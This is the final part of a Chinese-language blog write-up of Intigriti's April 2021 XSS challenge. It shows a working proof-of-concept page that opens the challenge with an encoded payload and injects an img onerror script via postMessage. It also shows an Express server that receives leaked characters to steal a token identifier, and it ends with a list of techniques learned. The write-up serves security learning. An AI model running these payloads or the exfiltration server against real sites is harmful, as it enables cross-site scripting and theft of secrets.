n0.alt+identifier&lt;location.hash+n18.alt?n26.src+++lo.src++:
n0.alt+identifier&lt;location.hash+n19.alt?n27.src+++lo.src++:
n0.alt+identifier&lt;location.hash+n20.alt?n28.src+++lo.src++:
n0.alt+identifier&lt;location.hash+n21.alt?n29.src+++lo.src++:
n0.alt+identifier&lt;location.hash+n22.alt?n30.src+++lo.src++:
n0.alt+identifier&lt;location.hash+n23.alt?n31.src+++lo.src++:
n0.alt+identifier&lt;location.hash+n24.alt?n32.src+++lo.src++:
n0.alt+identifier&lt;location.hash+n25.alt?n33.src+++lo.src++:
n0.alt+identifier&lt;location.hash+n26.alt?n34.src+++lo.src++:
n35.src+++lo.src++></span><span class="token template-punctuation string">`</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>  
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
    <span class="token keyword">var</span> payload <span class="token operator">=</span> <span class="token comment">// see above</span>
    payload <span class="token operator">=</span> <span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

    <span class="token keyword">var</span> baseUrl <span class="token operator">=</span> <span class="token string">'https://my_server'</span>

    <span class="token comment">// reset first</span>
    <span class="token function">fetch</span><span class="token punctuation">(</span>baseUrl <span class="token operator">+</span> <span class="token string">'/reset'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
      <span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>

    <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token comment">// assume identifier start with 1</span>
      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'POC started'</span><span class="token punctuation">)</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>window<span class="token punctuation">.</span>xssWindow<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        window<span class="token punctuation">.</span>xssWindow<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
      <span class="token punctuation">&#125;</span>

      window<span class="token punctuation">.</span>xssWindow <span class="token operator">=</span> window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">https://challenge-0421.intigriti.io/?error=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>payload<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">#1</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token string">'_blank'</span><span class="token punctuation">)</span>

      <span class="token function">polling</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">function</span> <span class="token function">polling</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token function">fetch</span><span class="token punctuation">(</span>baseUrl <span class="token operator">+</span> <span class="token string">'/polling'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">res</span> <span class="token operator">=></span> res<span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">token</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>

        <span class="token comment">// guess fail, restart</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>token <span class="token operator">===</span> <span class="token string">'1zz'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token function">fetch</span><span class="token punctuation">(</span>baseUrl <span class="token operator">+</span> <span class="token string">'/reset'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'guess fail, restart'</span><span class="token punctuation">)</span>
            <span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
          <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
          <span class="token keyword">return</span>
        <span class="token punctuation">&#125;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span>token<span class="token punctuation">.</span>length <span class="token operator">>=</span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          window<span class="token punctuation">.</span>xssWindow<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
            <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">'waf'</span><span class="token punctuation">,</span>
            <span class="token literal-property property">identifier</span><span class="token operator">:</span> token<span class="token punctuation">,</span>
            <span class="token literal-property property">str</span><span class="token operator">:</span> <span class="token string">'&lt;img src=xxx onerror=alert("flag&#123;THIS_IS_THE_FLAG&#125;")>'</span><span class="token punctuation">,</span>
            <span class="token literal-property property">safe</span><span class="token operator">:</span> <span class="token boolean">true</span>
          <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token string">'*'</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#125;</span>

        window<span class="token punctuation">.</span>xssWindow<span class="token punctuation">.</span>location <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">https://challenge-0421.intigriti.io/?error=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>payload<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">#</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>token<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span>

        <span class="token comment">// After POC finsihed, polling will timeout and got error message, I don't want to print the message</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>token<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">20</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">return</span>
        <span class="token punctuation">&#125;</span>

        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'token:'</span><span class="token punctuation">,</span> token<span class="token punctuation">)</span>
        <span class="token function">polling</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
      <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span>
  </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>寫得很隨便很醜而且有 bug 的 server side code：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span>

<span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token function">static</span><span class="token punctuation">(</span><span class="token string">'public'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  res<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'Access-Control-Allow-Origin'</span><span class="token punctuation">,</span> <span class="token string">'*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>

<span class="token keyword">const</span> handlerDelay <span class="token operator">=</span> <span class="token number">100</span>
<span class="token keyword">const</span> loopDelay <span class="token operator">=</span> <span class="token number">550</span>

<span class="token keyword">var</span> initialData <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
  <span class="token literal-property property">count</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>
  <span class="token literal-property property">token</span><span class="token operator">:</span> <span class="token string">'1'</span><span class="token punctuation">,</span>
  <span class="token literal-property property">canStartLoop</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
  <span class="token literal-property property">loopStarted</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
  <span class="token literal-property property">canSendBack</span><span class="token operator">:</span> <span class="token boolean">false</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">var</span> data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token operator">...</span>initialData<span class="token punctuation">&#125;</span>

app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/reset'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token operator">...</span>initialData<span class="token punctuation">&#125;</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'======reset====='</span><span class="token punctuation">)</span>
  res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">'reset ok'</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>

app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/polling'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">function</span> <span class="token function">handle</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>data<span class="token punctuation">.</span>canSendBack<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      data<span class="token punctuation">.</span>canSendBack <span class="token operator">=</span> <span class="token boolean">false</span>
      res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span>
      res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>token<span class="token punctuation">)</span>
      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'send back token:'</span><span class="token punctuation">,</span> data<span class="token punctuation">.</span>token<span class="token punctuation">)</span>

      <span class="token keyword">if</span> <span class="token punctuation">(</span>data<span class="token punctuation">.</span>token<span class="token punctuation">.</span>length <span class="token operator">&lt;</span> <span class="token number">14</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
          data<span class="token punctuation">.</span>canStartLoop <span class="token operator">=</span> <span class="token boolean">true</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> loopDelay<span class="token punctuation">)</span>
      <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
      <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
        <span class="token function">handle</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span>
      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> handlerDelay<span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>

  <span class="token function">handle</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>

app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/loop'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">function</span> <span class="token function">handle</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>data<span class="token punctuation">.</span>canStartLoop<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      data<span class="token punctuation">.</span>canStartLoop <span class="token operator">=</span> <span class="token boolean">false</span>
      res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span>
      res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
      <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
        <span class="token function">handle</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span>
      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> handlerDelay<span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>

  <span class="token function">handle</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>

app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/:char'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  <span class="token comment">// already start stealing identifier</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>params<span class="token punctuation">.</span>char<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span>
  <span class="token punctuation">&#125;</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'char received'</span><span class="token punctuation">,</span> req<span class="token punctuation">.</span>params<span class="token punctuation">.</span>char<span class="token punctuation">)</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>data<span class="token punctuation">.</span>loopStarted<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    data<span class="token punctuation">.</span>token <span class="token operator">+=</span> req<span class="token punctuation">.</span>params<span class="token punctuation">.</span>char
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'token:'</span><span class="token punctuation">,</span> data<span class="token punctuation">.</span>token<span class="token punctuation">)</span>
    data<span class="token punctuation">.</span>canSendBack <span class="token operator">=</span> <span class="token boolean">true</span>

    res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span>
    res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> 
  <span class="token punctuation">&#125;</span>

  <span class="token comment">// first round</span>
  data<span class="token punctuation">.</span>count<span class="token operator">++</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>data<span class="token punctuation">.</span>count <span class="token operator">===</span> <span class="token number">36</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'initial image loaded, start loop'</span><span class="token punctuation">)</span>
    data<span class="token punctuation">.</span>count <span class="token operator">=</span> <span class="token number">0</span>
    data<span class="token punctuation">.</span>loopStarted <span class="token operator">=</span> <span class="token boolean">true</span>
    data<span class="token punctuation">.</span>canStartLoop <span class="token operator">=</span> <span class="token boolean">true</span>
  <span class="token punctuation">&#125;</span>
  res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span>
  res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>

app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">5555</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'5555'</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2><span id="結語">結語</span></h2><p>從這個 XSS challenge 裡面學到滿多的東西的，例如說：</p>
<ol>
<li>利用 img src + onerror 製造迴圈（其實精確地講應該是遞迴啦）</li>
<li>利用 img src + srcset 來重複載入圖片</li>
<li>利用 location.hash 交換資訊</li>
<li>換個方式思考問題，用 &gt; &lt; 取代 &#x3D;&#x3D;，用比較代替等號</li>
<li>利用 &#x2F;a&#x2F;.source 或是 img.alt 之類的東西來取代字串，不使用單雙反引號構造字串</li>
</ol>
<p>雖然花了不少時間，但解出來的那一刻成就感滿大的，而且又是難題所以成就感更高了。</p>
<p>這篇主要是描述我自己的解法，雖然有點麻煩（因為需要 server side），但是是我唯一可以想出來的解法。</p>
<p>如果沒意外的話，下一篇會跟大家介紹官方解答，利用一個我不會用而且完全忽略掉的元素：<code>&lt;object&gt;</code>。</p>

    
    </div>
    
    <div class="columns is-variable is-1 is-multiline is-mobile">
    
        <span class="column is-narrow"><a class="tag is-light article-tag" href="/tags/Security/">#Security</a></span>
    
        <span class="column is-narrow"><a class="tag is-light article-tag" href="/tags/Front-end/">#Front-end</a></span>
    
    </div>
    
    
    <div class="columns is-mobile is-multiline article-nav">
        <span class="column is-12-mobile is-half-desktop  article-nav-prev">
            
            <a href="/2021/06/07/xss-challenge-by-intigriti-writeup-may/">Intigriti’s 0521 XSS 挑戰解法：限定字元組合程式碼</a>
            
        </span>
        <span class="column is-12-mobile is-half-desktop  article-nav-next">
            
            <a href="/2021/05/25/prevent-xss-is-not-that-easy/">防止 XSS 可能比想像中困難</a>
            
        </span>
    </div>
    
</article>




<div class="comments">
    <h3 class="title is-4">評論</h3>
    <script src="https://utteranc.es/client.js"
        repo="aszx87410/huli-blog"
        issue-term="title"
        theme="github-light"
        crossorigin="anonymous"
        async>
</script>
</div>

    </div>
</section>
    <footer class="footer">
    <div class="container">
        <div class="columns content">
            <div class="column is-narrow has-text-centered">
                &copy; 2025 Huli&nbsp;
                Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> & <a
                        target="_blank" rel="noopener" href="http://github.com/ppoffice/hexo-theme-minos">Minos</a>
            </div>
            <div class="column is-hidden-mobile"></div>

            
            <div class="column is-narrow">
                <div class="columns is-mobile is-multiline is-centered">
                
                    
                <a class="column is-narrow" title="GitHub" target="_blank" rel="noopener" href="https://github.com/ppoffice/hexo-theme-minos">
                    
                    GitHub
                    
                </a>
                
                </div>
            </div>
            
            
<div class="column is-narrow has-text-centered">
    <div class="dropdown is-up is-right is-hoverable" style="margin-top: -0.2em;">
        <div class="dropdown-trigger">
            <button class="button is-small" aria-haspopup="true">
                <span class="icon">
                    <i class="fas fa-globe"></i>
                </span>
                <span>繁體中文</span>
                <span class="icon is-small">
            <i class="fas fa-angle-down" aria-hidden="true"></i>
          </span>
            </button>
        </div>
        <div class="dropdown-menu has-text-left" role="menu" style="top:100%">
            <div class="dropdown-content">
            <!-- NOTE: 永遠回到首頁 -->
            
                <a href="/2021/05/25/en/xss-challenge-by-intigriti-writeup/" class="dropdown-item">
                    English
                </a>
            
            </div>
        </div>
    </div>
</div>

        </div>
    </div>
</footer>
    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>



    
    
    
    
    
    
<script src="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/js/lightgallery-all.min.js"></script>
<script>
    (function ($) {
        $(document).ready(function () {
            if (typeof($.fn.lightGallery) === 'function') {
                $('.article.gallery').lightGallery({ selector: '.gallery-item' });
            }
        });
    })(jQuery);
</script>

    
    
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.0/clipboard.min.js"></script>
    <style>
        .hljs {
            position: relative;
        }

        .hljs .clipboard-btn {
            float: right;
            color: #9a9a9a;
            background: none;
            border: none;
            cursor: pointer;
        }

        .hljs .clipboard-btn:hover {
          color: #8a8a8a;
        }

        .hljs > .clipboard-btn {
            display: none;
            position: absolute;
            right: 4px;
            top: 4px;
        }

        .hljs:hover > .clipboard-btn {
            display: inline;
        }

        .hljs > figcaption > .clipboard-btn {
            margin-right: 4px;
        }
    </style>
    <script>
      $(document).ready(function () {
        $('figure.hljs').each(function(i, figure) {
          var codeId = 'code-' + i;
          var code = figure.querySelector('.code');
          var copyButton = $('<button>Copy <i class="far fa-clipboard"></i></button>');
          code.id = codeId;
          copyButton.addClass('clipboard-btn');
          copyButton.attr('data-clipboard-target-id', codeId);

          var figcaption = figure.querySelector('figcaption');

          if (figcaption) {
            figcaption.append(copyButton[0]);
          } else {
            figure.prepend(copyButton[0]);
          }
        })

        var clipboard = new ClipboardJS('.clipboard-btn', {
          target: function(trigger) {
            return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
          }
        });
        clipboard.on('success', function(e) {
          e.clearSelection();
        })
      })
    </script>

    
    

    



<script src="/js/script.js?v=3.js"></script>


    
</body>
</html>